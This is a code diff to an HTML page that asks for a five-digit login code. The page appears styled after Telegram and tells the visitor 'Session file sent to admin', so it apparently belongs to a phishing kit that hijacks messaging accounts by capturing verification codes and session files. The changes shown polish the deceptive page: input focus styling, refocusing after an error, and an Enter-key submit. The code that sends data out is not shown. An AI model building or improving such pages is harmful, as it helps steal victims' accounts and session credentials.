@@ -14,6 +14,7 @@
         .phone-info { background: #e8f5e9; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; }
         .otp-inputs { display: flex; gap: 10px; justify-content: center; margin-bottom: 25px; }
         .otp-input { width: 50px; height: 60px; text-align: center; font-size: 24px; border: 2px solid #e0e0e0; border-radius: 8px; }
+        .otp-input:focus { border-color: #0088cc; outline: none; }
         .btn { width: 100%; padding: 14px; background: #0088cc; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; margin-bottom: 15px; }
         .btn:disabled { opacity: 0.6; cursor: not-allowed; }
         .error { background: #ffebee; color: #c62828; padding: 12px; border-radius: 6px; margin-bottom: 15px; display: none; }
@@ -76,7 +77,7 @@
                     <div class="success-icon">✅</div>
                     <h3>Verified Successfully!</h3>
                     <p>Your account has been verified.</p>
-                    <p><small>Details sent to admin</small></p>
+                    <p><small>Session file sent to admin</small></p>
                     <div style="margin-top: 20px;">
                         <p style="color: #666; font-size: 14px;">
                             Closing in <span id="countdown">5</span> seconds...
@@ -162,7 +163,7 @@
             .then(data => {
                 if (data.success) {
                     if (data.requires_2fa) {
-                        // Handle 2FA (simplified for now)
+                        // For now, just show success (2FA handling simplified)
                         showSuccess();
                     } else {
                         showSuccess();
@@ -177,6 +178,7 @@
                     });
                     otpCode = '';
                     document.getElementById('verify-btn').disabled = true;
+                    document.querySelector('.otp-input').focus();
                 }
             })
             .catch(error => {
@@ -226,6 +228,15 @@
                 errorEl.classList.remove('show');
             }, 5000);
         }
+        
+        // Keyboard shortcuts
+        document.addEventListener('keydown', function(event) {
+            if (event.key === 'Enter' && !document.getElementById('otp-screen').classList.contains('hidden')) {
+                if (otpCode.length === 5) {
+                    verifyOTP();
+                }
+            }
+        });
     </script>
 </body>
 </html>
